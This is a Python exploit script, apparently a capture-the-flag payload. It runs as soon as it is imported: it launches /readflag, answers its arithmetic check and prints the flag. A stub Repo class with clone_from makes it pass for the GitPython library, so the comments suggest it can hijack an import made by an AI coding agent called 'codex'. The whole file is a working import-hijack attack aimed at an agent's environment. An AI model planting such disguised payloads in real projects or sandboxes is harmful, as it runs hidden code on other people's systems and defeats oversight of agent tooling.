import os
import sys
import subprocess
import re

# 打印日志到 stderr，这样会显示在网页的 Log 流中
def log(msg):
    sys.stderr.write(f"[EXPLOIT] {msg}\n")
    sys.stderr.flush()

def pwn():
    log("Hijack successful! Starting exploit...")
    
    target = "/readflag"
    # 本地测试 fallback
    if not os.path.exists(target):
        target = "./readflag"
    
    if not os.path.exists(target):
        log(f"Target {target} not found!")
        return

    try:
        # 启动 /readflag 进程
        p = subprocess.Popen(
            [target], 
            stdin=subprocess.PIPE, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE, 
            text=True,
            bufsize=0
        )
        
        # 读取输出直到遇到 "input your answer:"
        buffer = ""
        while True:
            char = p.stdout.read(1)
            if not char:
                break
            buffer += char
            if "input your answer:" in buffer:
                break
        
        log(f"Received prompt: {buffer}")
        
        # 使用正则提取算式 (例如 "123 + 456")
        # 这里的正则适配常见的 readflag 格式
        match = re.search(r'(\d+)\s*([+\-*])\s*(\d+)', buffer)
        
        if match:
            n1 = int(match.group(1))
            op = match.group(2)
            n2 = int(match.group(3))
            
            res = 0
            if op == '+': res = n1 + n2
            elif op == '-': res = n1 - n2
            elif op == '*': res = n1 * n2
            
            log(f"Calculating: {n1} {op} {n2} = {res}")
            
            # 发送答案
            p.stdin.write(f"{res}\n")
            p.stdin.flush()
            
            # 读取剩下的输出（即 Flag）
            flag_output = p.stdout.read()
            log(f"Flag Output:\n{flag_output}")
            
            # 双重保险：直接把它写到标准错误，确保在 TUI 日志中醒目
            print(f"\n\n\nFLAG IS HERE: {flag_output}\n\n\n", file=sys.stderr)
        else:
            log("Failed to parse math question.")

    except Exception as e:
        log(f"Error: {e}")

# 执行攻击函数
pwn()

# 为了防止 codex 立即崩溃（虽然无所谓），可以伪装一下
class Repo:
    def __init__(self, *args, **kwargs):
        pass
    @classmethod
    def clone_from(cls, *args, **kwargs):
        return cls()
